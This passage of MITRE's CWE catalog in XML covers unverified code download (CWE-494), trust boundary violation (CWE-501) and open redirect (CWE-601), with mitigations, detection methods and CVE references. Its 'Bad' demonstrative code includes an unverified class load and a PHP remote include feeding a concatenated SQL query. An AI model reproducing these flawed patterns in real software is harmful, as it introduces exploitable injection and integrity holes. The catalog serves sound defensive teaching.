               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example loads an external class from a local subdirectory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>URL[] classURLs= new URL[]{<xhtml:div style="margin-left:1em;">new URL("file:subdir/")</xhtml:div>};<xhtml:br/>URLClassLoader loader = new URLClassLoader(classURLs);<xhtml:br/>Class loadedClass = Class.forName("loadMe", true, loader);</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-219">
               <Intro_Text>This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:i>//assume the password is already encrypted, avoiding CWE-312</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>function authenticate($username,$password){<xhtml:div style="margin-left:1em;">
                        <xhtml:br/>include("http://external.example.com/dbInfo.php");<xhtml:br/>
                        <xhtml:br/>
                        <xhtml:i>//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available</xhtml:i>
                        <xhtml:br/>mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');<xhtml:br/>mysql_select_db($dbname);<xhtml:br/>$query = 'Select * from users where username='.$username.' And password='.$password;<xhtml:br/>$result = mysql_query($query);<xhtml:br/>
                        <xhtml:br/>if(mysql_numrows($result) == 1){<xhtml:div style="margin-left:1em;">mysql_close();<xhtml:br/>return true;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">mysql_close();<xhtml:br/>return false;</xhtml:div>}</xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account.</Body_Text>
               <Body_Text>This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-9534</Reference>
               <Description>Satellite phone does not validate its firmware image.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-9534</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22909</Reference>
               <Description>Chain: router's firmware update procedure uses curl with "-k" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22909</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3438</Reference>
               <Description>OS does not verify authenticity of its own updates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3438</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3324</Reference>
               <Description>online poker client does not verify authenticity of its own updates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3324</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1125</Reference>
               <Description>anti-virus product does not verify automatic updates for itself.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1125</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0671</Reference>
               <Description>VOIP phone downloads applications from web sites without verifying integrity.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0671</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Invoking untrusted mobile code</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP27</Entry_ID>
               <Entry_Name>Tainted input to environment</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="184"/>
            <Related_Attack_Pattern CAPEC_ID="185"/>
            <Related_Attack_Pattern CAPEC_ID="186"/>
            <Related_Attack_Pattern CAPEC_ID="187"/>
            <Related_Attack_Pattern CAPEC_ID="533"/>
            <Related_Attack_Pattern CAPEC_ID="538"/>
            <Related_Attack_Pattern CAPEC_ID="657"/>
            <Related_Attack_Pattern CAPEC_ID="662"/>
            <Related_Attack_Pattern CAPEC_ID="691"/>
            <Related_Attack_Pattern CAPEC_ID="692"/>
            <Related_Attack_Pattern CAPEC_ID="693"/>
            <Related_Attack_Pattern CAPEC_ID="695"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-454"/>
            <Reference External_Reference_ID="REF-455"/>
            <Reference External_Reference_ID="REF-456"/>
            <Reference External_Reference_ID="REF-457"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 18: The Sins of Mobile Code.&#34; Page 267"/>
            <Reference External_Reference_ID="REF-459"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Research Gap">This is critical for mobile code, but it is likely to become more and more common as developers continue to adopt automated, network-based product distributions and upgrades. Software-as-a-Service (SaaS) might introduce additional subtleties. Common exploitation scenarios may include ad server compromises and bad upgrades.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Name, Other_Notes, Potential_Mitigations, References, Relationships, Research_Gaps, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Mobile Code: Invoking Untrusted Mobile Code</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Download of Untrusted Mobile Code Without Integrity Check</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="501" Name="Trust Boundary Violation" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product mixes trusted and untrusted data in the same data structure or structured message.</Description>
         <Extended_Description>A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code accepts an HTTP request and stores the username parameter in the HTTP session object before checking to ensure that the user has been authenticated.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>usrname = request.getParameter("usrname");<xhtml:br/>if (session.getAttribute(ATTR_USR) == null) {<xhtml:div style="margin-left:1em;">session.setAttribute(ATTR_USR, usrname);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>usrname = request.Item("usrname");<xhtml:br/>if (session.Item(ATTR_USR) == null) {<xhtml:div style="margin-left:1em;">session.Add(ATTR_USR, usrname);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Trust Boundary Violation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Demonstrative_Example, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="601" Name="URL Redirection to Untrusted Site ('Open Redirect')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.</Description>
         <Extended_Description>An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance. Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Open Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-site Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-domain Redirect</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Other</Impact>
               <Note>The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives.</Description>
            </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
